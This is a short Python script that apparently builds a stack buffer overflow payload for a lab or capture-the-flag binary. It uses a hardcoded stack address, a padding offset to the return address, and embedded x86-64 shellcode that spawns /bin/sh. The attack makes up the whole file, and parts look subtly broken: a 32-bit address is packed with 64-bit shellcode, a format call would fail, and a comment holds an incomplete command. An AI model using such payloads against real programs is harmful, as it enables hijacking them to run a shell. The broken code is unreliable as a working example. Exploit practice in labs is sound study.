import struct


BUFFER_START = 0xffffd670
LEN_BUFF_TO_EIP = 71
SHELLCODE = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
NULLBYTE = "\x00"*4


TOTAL_LEN = (len(SHELLCODE + NULLBYTE))
TO_POINT = BUFFER_START + (LEN_BUFF_TO_EIP - TOTAL_LEN)
TO_POINT = struct.pack("<I", TO_POINT)

PAYLOAD = "A"*(LEN_BUFF_TO_EIP - TOTAL_LEN) + SHELLCODE + NULLBYTE + TO_POINT


print("\\x".join("{:02x}".format(c) for c in ['A'*100]))

# run <<< $(python3 'print("00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45")')